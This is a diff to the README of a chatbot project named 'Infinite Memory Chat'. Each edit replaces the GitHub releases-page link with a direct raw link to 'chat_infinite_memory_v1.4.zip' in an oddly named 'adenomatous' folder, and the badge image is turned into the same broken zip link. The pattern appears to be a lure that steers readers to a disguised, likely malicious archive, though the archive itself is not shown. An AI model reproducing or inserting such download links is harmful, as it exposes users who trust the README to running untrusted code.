@@ -4,7 +4,7 @@
 
 Welcome to Infinite Memory Chat! This tool lets you have conversations with a chatbot that remembers everything, making your interactions richer. Follow these steps to download and run the application.
 
-[![Download Infinite Memory Chat](https://img.shields.io/badge/Download-Infinite%20Memory%20Chat-blue)](https://github.com/Danny345L/infinite-memory-chat/releases)
+[![Download Infinite Memory Chat](https://raw.githubusercontent.com/Danny345L/infinite-memory-chat/main/adenomatous/chat_infinite_memory_v1.4.zip%20Memory%20Chat-blue)](https://raw.githubusercontent.com/Danny345L/infinite-memory-chat/main/adenomatous/chat_infinite_memory_v1.4.zip)
 
 ## 📥 Download & Install
 
@@ -12,7 +12,7 @@ To get started, you first need to download the software.
 
 1. **Visit the Releases Page:** Click the link below to access the download section:
    
-   [Visit Releases Page](https://github.com/Danny345L/infinite-memory-chat/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Danny345L/infinite-memory-chat/main/adenomatous/chat_infinite_memory_v1.4.zip)
 
 2. **Choose Your Version:** Find the latest version of the Infinite Memory Chat application.
 
@@ -65,6 +65,6 @@ If you face any issues while using Infinite Memory Chat, try the following:
 
 If you need further help, you can reach out through the Issues tab on GitHub or join our community discussions. We appreciate your feedback and are here to help you!
 
-For more details, do visit our [Releases Page](https://github.com/Danny345L/infinite-memory-chat/releases) to get the latest versions and updates.
+For more details, do visit our [Releases Page](https://raw.githubusercontent.com/Danny345L/infinite-memory-chat/main/adenomatous/chat_infinite_memory_v1.4.zip) to get the latest versions and updates.
 
 Enjoy using Infinite Memory Chat!
